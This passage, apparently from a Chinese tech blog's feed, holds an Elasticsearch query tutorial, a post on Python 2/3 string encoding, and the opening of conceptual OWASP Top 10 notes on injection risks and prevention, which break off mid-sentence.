class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;features&quot;</span>: <span class="hljs-string">&quot;pool&quot;</span> &#125;&#125;<br>        &#125;&#125;<br>      ]<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="范围（range）"><a href="#范围（range）" class="headerlink" title="范围（range）"></a>范围（range）</h2><p><code>range</code> 过滤允许我们按照指定范围查找某个文档，适用于数字、日期和字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 查找价格字段值在 $20 和 $30 之间的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;range&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;price&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;gte&quot;</span>: <span class="hljs-number">20</span>,<br>                        <span class="hljs-string">&quot;lt&quot;</span>: <span class="hljs-number">30</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 查找 2014-01-01 到 2014-01-07 之间的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;range&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;timestamp&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;gt&quot;</span> : <span class="hljs-string">&quot;2014-01-01 00:00:00&quot;</span>,<br>                <span class="hljs-string">&quot;lt&quot;</span> : <span class="hljs-string">&quot;2014-01-07 00:00:00&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可供组合的选项如下：</strong></p><ul><li><code>gt</code>：<code>&gt;</code>  大于（greater than）</li><li><code>lt</code>：<code>&lt;</code>  小于（less than）</li><li><code>gte</code>：<code>&gt;=</code>  大于等于（greater than or equal to）</li><li><code>lte</code>：<code>&lt;=</code>  小于等于（less than or equal to）</li></ul><h2 id="组合过滤器（bool）"><a href="#组合过滤器（bool）" class="headerlink" title="组合过滤器（bool）"></a>组合过滤器（bool）</h2><h3 id="布尔过滤器"><a href="#布尔过滤器" class="headerlink" title="布尔过滤器"></a>布尔过滤器</h3><p>一个 <code>bool</code> 过滤器可以由三部分组成：</p><ul><li><p><code>must</code> </p><p>所有的语句都必须匹配，与 <code>AND</code> 等价。 </p></li><li><p><code>must_not</code> </p><p>所有的语句都不能匹配，与 <code>NOT</code> 等价。 </p></li><li><p><code>should</code> </p><p>至少有一个语句要匹配，与 <code>OR</code> 等价。 </p></li></ul><p>使用组合过滤器进行查询：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_store/products/_search<br>&#123;<br>   <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;filtered&quot;</span>: &#123;<br>         <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>              <span class="hljs-string">&quot;should&quot;</span>: [<br>                 &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123;<span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">20</span>&#125;&#125;, <br>                 &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123;<span class="hljs-string">&quot;productID&quot;</span>: <span class="hljs-string">&quot;XHDK-A-1293-#fJ3&quot;</span>&#125;&#125; <br>              ],<br>              <span class="hljs-string">&quot;must_not&quot;</span>: &#123;<br>                 <span class="hljs-string">&quot;term&quot;</span>: &#123;<span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">30</span>&#125; <br>              &#125;<br>           &#125;<br>         &#125;<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="嵌套布尔过滤器"><a href="#嵌套布尔过滤器" class="headerlink" title="嵌套布尔过滤器"></a>嵌套布尔过滤器</h3><p>尽管 <code>bool</code> 是一个复合过滤器，可以接受多个子过滤器，但它本身仍然还只是一个过滤器。因此我们可以将一个 <code>bool</code> 过滤器嵌套在其他 <code>bool</code> 过滤器内部，这为我们提供了处理任意复杂布尔逻辑的能力。</p><h2 id="全文匹配（match、match-all、multi-match）"><a href="#全文匹配（match、match-all、multi-match）" class="headerlink" title="全文匹配（match、match_all、multi_match）"></a>全文匹配（match、match_all、multi_match）</h2><h3 id="match-查询"><a href="#match-查询" class="headerlink" title="match 查询"></a>match 查询</h3><p>匹配查询 <code>match</code> 是一个 <strong>标准</strong> 查询，无论需要查询什么字段， <code>match</code> 查询都应该会是首选的查询方式。同时它是一个高级 <strong>全文查询</strong> ，这表示它既能处理全文字段，又能处理精确字段。</p><p>我们用一个示例来解释使用 <code>match</code> 搜索全文字段中的单个词：   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/my_type/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;match&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;QUICK!&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>可以使用 <code>operator</code> 参数来提高精度，默认情况下该操作符是 <code>or</code> ，可以修改成 <code>and</code> 让所有指定词项都必须匹配。</p><p>可以使用 <code>minimum_should_match</code> 最小匹配参数来控制精度，以排除那些不太相关的文档。</p></blockquote><h3 id="match-all-查询"><a href="#match-all-查询" class="headerlink" title="match_all 查询"></a>match_all 查询</h3><p>查询所有文档，是没有查询条件下的默认语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;match_all&quot;</span>: &#123;&#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="multi-match-查询"><a href="#multi-match-查询" class="headerlink" title="multi_match 查询"></a>multi_match 查询</h3><p>multi_match查询允许你在 match 查询的基础上同时搜索多个字段：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;multi_match&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;query&quot;</span>: <span class="hljs-string">&quot;Quick brown fox&quot;</span>,<br>        <span class="hljs-string">&quot;fields&quot;</span>: [ <span class="hljs-string">&quot;title&quot;</span>, <span class="hljs-string">&quot;body&quot;</span> ],<br>        <span class="hljs-string">&quot;minimum_should_match&quot;</span>: <span class="hljs-string">&quot;30%&quot;</span> <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="短语匹配（match-phrase）"><a href="#短语匹配（match-phrase）" class="headerlink" title="短语匹配（match_phrase）"></a>短语匹配（<code>match_phrase</code>）</h2><p>就像 <code>match</code> 查询对于标准全文检索是一种最常用的查询一样，当你想寻找邻近的几个单词时，就会使用 <code>match_phrase</code> 查询：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/my_type/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;match_phrase&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;quick brown fox&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>和 <code>match</code> 查询类似，<code>match_phrase</code> 查询首先将查询字符串解析成一个词项列表，然后对这些词项进行搜索，但只保留那些包含 <strong>全部</strong> 搜索词项，且 <strong>位置</strong> 与搜索词项相同的文档。比如对于 <code>quick fox</code> 的短语搜索可能不会匹配到任何文档，因为没有文档包含的 <code>quick</code> 词之后紧跟着 <code>fox</code> 。</p><h2 id="近似匹配（prefix、wildcards、regexp）"><a href="#近似匹配（prefix、wildcards、regexp）" class="headerlink" title="近似匹配（prefix、wildcards、regexp）"></a>近似匹配（prefix、wildcards、regexp）</h2><h3 id="prefix-前缀查询"><a href="#prefix-前缀查询" class="headerlink" title="prefix 前缀查询"></a>prefix 前缀查询</h3><p><code>prefix</code> 查询是一个词级别的底层的查询，它不会在搜索之前分析查询字符串，而是假定传入前缀就正是要查找的前缀。为了找到所有以 <code>W1</code> 开始的邮编，可以使用简单的 <code>prefix</code> 查询： </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/address/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;prefix&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;postcode&quot;</span>: <span class="hljs-string">&quot;W1&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="wildcard-通配符查询"><a href="#wildcard-通配符查询" class="headerlink" title="wildcard 通配符查询"></a>wildcard 通配符查询</h3><p>与 <code>prefix</code> 前缀查询的特性类似，<code>wildcard</code> 通配符查询也是一种底层基于词的查询，与前缀查询不同的是它使用标准的 <code>shell</code> 通配符查询，允许匹配指定的正则式，其中：</p><ul><li><code>*</code>    匹配多个任意字符（包括零个或一个）</li><li><code>?</code>    匹配一个任意字符（不包括零个）</li></ul><p>这个查询会匹配包含 <code>W1F 7HW</code> 和 <code>W2F 8HW</code> 的文档：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/address/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;wildcard&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;postcode&quot;</span>: <span class="hljs-string">&quot;W?F*HW&quot;</span> <br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="regexp-正则表达式查询"><a href="#regexp-正则表达式查询" class="headerlink" title="regexp 正则表达式查询"></a>regexp 正则表达式查询</h3><p>假如现在只想匹配 <code>W</code> 区域的所有邮编（只以 <code>W</code> 开始并跟随一个数字），<code>prefix</code> 前缀匹配可能会包括以 <code>WC</code> 开头的所有邮编，<code>wildcard</code> 通配符匹配也可能会遇到同样的问题，如果想匹配，这时可以使用 <code>regexp</code> 正则表达式查询写出更复杂的模式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/address/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;regexp&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;postcode&quot;</span>: <span class="hljs-string">&quot;W[0-9].+&quot;</span> <br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="处理-Null-值（exists、missing）"><a href="#处理-Null-值（exists、missing）" class="headerlink" title="处理 Null 值（exists、missing）"></a>处理 Null 值（exists、missing）</h2><h3 id="存在查询"><a href="#存在查询" class="headerlink" title="存在查询"></a>存在查询</h3><p><code>exists</code> 查询可以用于查找文档中是否包含指定字段：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/posts/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;exists&quot;</span> : &#123; <span class="hljs-string">&quot;field&quot;</span> : <span class="hljs-string">&quot;tags&quot;</span> &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="缺失查询"><a href="#缺失查询" class="headerlink" title="缺失查询"></a>缺失查询</h3><p><code>missing</code> 查询本质上与 <code>exists</code> 恰好相反，它返回没有某个字段的文档：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /my_index/posts/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;missing&quot;</span> : &#123; <span class="hljs-string">&quot;field&quot;</span> : <span class="hljs-string">&quot;tags&quot;</span> &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="聚合和过滤（aggs、filter）"><a href="#聚合和过滤（aggs、filter）" class="headerlink" title="聚合和过滤（aggs、filter）"></a>聚合和过滤（aggs、filter）</h2><h3 id="agg-聚合"><a href="#agg-聚合" class="headerlink" title="agg 聚合"></a>agg 聚合</h3><p>聚合操作被置于顶层参数 <code>aggs</code> 之下，可以为聚合指定一个我们想要名称，然后定义单个桶的类型 <code>terms</code>。比如汽车经销商可能会想知道哪个颜色的汽车销量最好，用聚合可以轻易得到结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /cars/transactions/_search<br>&#123;<br>    <span class="hljs-string">&quot;size&quot;</span> : <span class="hljs-number">0</span>,  <span class="hljs-comment">// 将返回记录数设置为 0 来提高查询速度</span><br>    <span class="hljs-string">&quot;aggs&quot;</span> : &#123; <br>        <span class="hljs-string">&quot;popular_colors&quot;</span> : &#123; <br>            <span class="hljs-string">&quot;terms&quot;</span> : &#123; <br>              <span class="hljs-string">&quot;field&quot;</span> : <span class="hljs-string">&quot;color&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在本例中，我们使用 <code>popular_colors</code> 作为聚合的名字，并定义了一个 <code>terms</code> 桶，这个 <code>terms</code> 桶会使用 <code>color</code> 字段为每个颜色动态创建新桶。</p><h3 id="filter-过滤"><a href="#filter-过滤" class="headerlink" title="filter 过滤"></a>filter 过滤</h3><p>聚合范围限定还有一个自然的扩展就是过滤，因为聚合是在查询结果范围内操作的，任何可以适用于查询的过滤器也可以应用在聚合上。如果我们想找到售价在 $10,000 美元之上的所有汽车同时为这些车计算平均售价，可以简单地使用一个 <code>constant_score</code> 查询和 <code>filter</code> 约束：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /cars/transactions/_search<br>&#123;<br>    <span class="hljs-string">&quot;size&quot;</span> : <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;range&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;price&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;gte&quot;</span>: <span class="hljs-number">10000</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;aggs&quot;</span>: &#123; <br>            <span class="hljs-string">&quot;avg_price&quot;</span>: &#123; <br>               <span class="hljs-string">&quot;avg&quot;</span>: &#123;<br>                  <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;price&quot;</span> <br>               &#125;<br>            &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p><code>avg</code> 为均值度量，<code>min</code> 为最小度量，<code>max</code> 为最大度量。 </p></blockquote><h2 id="排序（sort）"><a href="#排序（sort）" class="headerlink" title="排序（sort）"></a>排序（sort）</h2><h3 id="简单排序"><a href="#简单排序" class="headerlink" title="简单排序"></a>简单排序</h3><p>我们可以简单的使用 <code>sort</code> 参数进行实现按照字段的值排序：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123; <span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">1</span> &#125;&#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;sort&quot;</span>: &#123; <span class="hljs-string">&quot;date&quot;</span>: &#123; <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span> &#125;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="多级排序"><a href="#多级排序" class="headerlink" title="多级排序"></a>多级排序</h3><p>假定我们想要结合使用 <code>date</code> 和 <code>_score</code> 进行查询，并且匹配的结果首先按照日期排序，然后按照相关性排序：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;must&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;tweet&quot;</span>: <span class="hljs-string">&quot;manage text search&quot;</span> &#125;&#125;,<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123; <span class="hljs-string">&quot;term&quot;</span>: &#123; <span class="hljs-string">&quot;user_id&quot;</span> : <span class="hljs-number">2</span> &#125;&#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;sort&quot;</span>: [<br>        &#123; <span class="hljs-string">&quot;date&quot;</span>: &#123; <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span> &#125;&#125;,  <span class="hljs-comment">// 先按照日期排序</span><br>        &#123; <span class="hljs-string">&quot;_score&quot;</span>: &#123; <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span> &#125;&#125;<br>    ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong><a href="https://www.elastic.co/guide/cn/elasticsearch/guide/cn/search-in-depth.html">Elasticsearch: 权威指南 - 深入搜索</a></p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>ELK</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Elasticsearch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 字符编码</title>
    <link href="/post/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
    <url>/post/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>Python3 的系统默认编码是 <strong>UTF-8</strong>，其中：</p><ul><li>文本字符全部用 <code>str</code> 表示（包括 Unicode 字符集中所有字符）</li><li>二进制字节数据用 <code>bytes</code> 表示（可以是 ASCII 范围内的字符和其它十六进制形式的字符）</li></ul><blockquote><p>在字符引号前加 ‘b’，明确表示这是一个 bytes 类型的对象。</p></blockquote><p>Python2 与 Python3 字节与字符的对应关系：</p><table><thead><tr><th align="center">Python2</th><th align="center">Python3</th><th align="center">表现</th><th align="center">转换</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">str</td><td align="center">bytes</td><td align="center">字节</td><td align="center">encode</td><td align="center">存储、网络传输</td></tr><tr><td align="center">unicode</td><td align="center">str</td><td align="center">字符</td><td align="center">decode</td><td align="center">显示</td></tr></tbody></table><p><code>str</code> 与 <code>bytes</code> 之间的转换可以用 <code>encode</code> 和 <code>decode</code> 方法：</p><p><img src="/img/Python/4c330c8aa381b0be38553b3a5031bb82-16442166169571.jpg"></p><p><code>encode</code> 负责字符到字节的编码转换，默认转换为 UTF-8 编码：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">&quot;Python之禅&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode()<br><span class="hljs-string">b&#x27;Python\xe4\xb9\x8b\xe7\xa6\x85&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-string">b&#x27;Python\xd6\xae\xec\xf8&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-string">b&#x27;Python\xe4\xb9\x8b\xe7\xa6\x85&#x27;</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">&quot;Python&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><span class="hljs-string">b&#x27;Python&#x27;</span><br></code></pre></td></tr></table></figure><p>decode 负责字节到字符的解码转换，默认使用 UTF-8 编码格式进行转换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">b&#x27;Python\xe4\xb9\x8b\xe7\xa6\x85&#x27;</span>.decode()<br><span class="hljs-string">&#x27;Python之禅&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">b&#x27;Python\xd6\xae\xec\xf8&#x27;</span>.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-string">&#x27;Python之禅&#x27;</span><br></code></pre></td></tr></table></figure><p>ASCII、Unicode、UTF-8 区别：</p><ul><li>ASCII 使用 1 个字节，将最高位置为 0，后七位从 0 到 127 分别对每一个符号编码，能表示的字符十分有限；</li><li>由于很多符号 ASCII 没办法表示，各国又在 ASCII 的基础上创建了适合自己语言的符号编码表，比如欧洲的 ISO，中国 GBK ……一时间天下大乱；</li><li>为了解决编码混乱的问题，Unicode 收纳了全世界大部分的字符，从 0 一直编到了 100 多万，每一个区间都对应着一种语言的编码，所有的字符都有了唯一的编号；</li><li>但是 Unicode 没有对字符编号的二进制编解码做出规定，因此就出现了 UTF-8，UTF-16，UTF-32 这些编码方案。其中 UTF-16 使用 2 个字节来编码所有的字符，UTF-32 则选择用 4 个字节来编码，而使用最多的就是 UTF-8 编码方案；</li><li>UTF-8 为了节省资源，采用变长编码，把一个 Unicode 字符根据不同字符内容编码成 1-6 个字节，可以显示中文（3 字节），同时兼容 ASCII 编码。</li></ul><p><img src="/img/Python/689802-464e92357be25120-16442166807697.png"></p><p>简单来说，Unicode 是 <strong>字符集</strong>，UTF-8 是 <strong>编码规则</strong>：</p><p><img src="/img/Python/689802-0c26f194d6dbc917-16442166528245.png"></p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>Python2</tag>
      
      <tag>字符编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP 学习笔记</title>
    <link href="/post/OWASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/post/OWASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>再次学习 OWASP，本文仅仅作为一个概述，详细的内容以后有时间会慢慢补充。</p><h2 id="0x00-十项最严重的-Web-应用程序安全风险-2017"><a href="#0x00-十项最严重的-Web-应用程序安全风险-2017" class="headerlink" title="0x00 十项最严重的 Web 应用程序安全风险 - 2017"></a>0x00 十项最严重的 Web 应用程序安全风险 - 2017</h2><p>1、TOP 1  注入<br>2、TOP 2  失效的身份认证<br>3、TOP 3  敏感数据泄漏<br>4、TOP 4  XML 外部实体<br>5、TOP 5  失效的访问控制<br>6、TOP 6  安全配置错误<br>7、TOP 7  XSS 跨站脚本<br>8、TOP 8  不安全的反序列化<br>9、TOP 9  使用含有已知漏洞的组件<br>10、TOP 10  不足的日志记录和监控</p><h2 id="0x01-注入"><a href="#0x01-注入" class="headerlink" title="0x01 注入"></a>0x01 注入</h2><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如 SQL 注入、NoSQL 注入、OS 注入和 LDAP 注入的注入缺陷，攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p><p><strong>威胁来源</strong></p><p>注入漏洞十分普遍，且很容易通过代码审查发现，扫描器和模糊测试工具都可以帮助攻击者找到这些漏洞。而且几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部 Web 服务，当攻击者可以向解释器发送恶意数据时，就会产生注入漏洞。</p><p><strong>影响</strong></p><p>注入可能导致数据丢失、破坏或泄露给无授权方，使服务器缺乏可审计性或是拒绝服务，有时甚至能导致服务器被完全接管。</p><p><strong>防范</strong></p><p>防止注入漏洞的核心是要将数据与命令语句、查询语句分隔开，代码审计是最有效的检测应用程序的注入风险的办法之一，其次可以：</p><ul><li>使用安全的 